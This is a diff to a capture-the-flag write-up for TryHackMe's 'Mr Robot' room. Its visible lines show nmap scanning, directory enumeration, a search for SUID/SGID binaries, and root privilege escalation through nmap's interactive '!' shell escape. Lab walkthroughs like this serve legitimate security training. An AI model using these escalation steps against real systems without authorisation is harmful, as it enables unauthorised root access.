@@ -2,8 +2,7 @@
 
 Room link: https://tryhackme.com/room/mrrobot
 
-# Key 1
-
+## Key 1
 As always, for my first scan I used an aggressive NMAP scan. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nmap -A [Remote IP]
@@ -98,9 +97,7 @@ fsocity.dic
 key-1-of-3.txt
 ```
 I can run ```curl http://[Remote IP]/key-1-of-3.txt``` to get the first key, done! 
-
-# Key 2
-
+## Key 2
 The output of the directory enumeration (gobuster) also pointed me to the ```/license``` directory. If I navigate to the site, it appears to supply some base64 encoded string at the bottom of the page. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ curl http://[Remote IP]/license
@@ -154,8 +151,7 @@ robot@linux:~$ wc -c key-2-of-3.txt
 wc -c key-2-of-3.txt
 33 key-2-of-3.txt
 ```
-# Key 3
-
+## Key 3
 Key 3 probably requires privilege escalation. I wanted to see if I could use a GTFO bin to execute a binary as root user and gain its privilege. I used ```find / -perm +6000 2>/dev/null``` to do so, which checks for files with SGID/SUID bit set. 
 ```
 robot@linux:~$ find / -perm +6000 2>/dev/null
@@ -211,7 +207,6 @@ find / -perm +6000 2>/dev/null
 /sbin/unix_chkpwd
 ```
 Analyzing the output of the command, it looks like I can priv esc using nmap (```/usr/local/bin/nmap```) in interactive mode (https://vk9-sec.com/nmap-privilege-escalation/). 
-
 ```
 robot@linux:~$ nmap --interactive
 nmap --interactive
@@ -220,7 +215,6 @@ Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
 ```
 Nmap has some cool commands in interactive mode that I didnt know about. 
-
 ```
 nmap> h
 h
@@ -244,7 +238,6 @@ n -sS -O -v example.com/24
 f --spoof "/usr/local/bin/pico -z hello.c" -sS -oN e.log example.com/24
 ```
 Running a command with ```!``` at the beginning allows me to run a shell command. And like that, I can read the last key! 
-
 ```
 nmap> !wc -c /root/key-3-of-3.txt
 !wc -c /root/key-3-of-3.txt
